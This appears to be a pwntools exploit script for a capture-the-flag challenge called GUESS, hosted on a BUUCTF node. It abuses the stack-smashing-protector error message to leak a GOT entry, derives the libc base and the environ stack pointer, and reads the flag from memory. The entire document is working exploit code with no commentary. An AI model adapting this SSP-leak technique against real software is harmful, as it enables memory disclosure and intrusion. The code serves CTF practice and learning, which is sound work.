from pwn import *
context.log_level = 'debug'

# io = process('./GUESS')
io = remote('node4.buuoj.cn', 28148)
elf = ELF('./GUESS')
libc = ELF('./libc.so.6')


io.sendlineafter(b'Please type your guessing flag\n', cyclic(0x128) + p64(elf.got['puts']))
io.recvuntil(b'*** stack smashing detected ***: ')
puts = u64(io.recv(6) + b'\x00\x00')
base = puts - libc.symbols['puts']
log.info('libc base: ' + hex(base))
environ = base + libc.symbols['environ']
log.info('environ: ' + hex(environ))

io.sendlineafter(b'Please type your guessing flag\n', cyclic(0x128) + p64(environ))
io.recvuntil(b'*** stack smashing detected ***: ')
stack_addr = u64(io.recv(6) + b'\x00\x00')
flag_addr = stack_addr - 0x168
log.info('stack address: ' + hex(stack_addr))

io.sendlineafter(b'Please type your guessing flag\n', cyclic(0x128) + p64(flag_addr))

io.interactive()
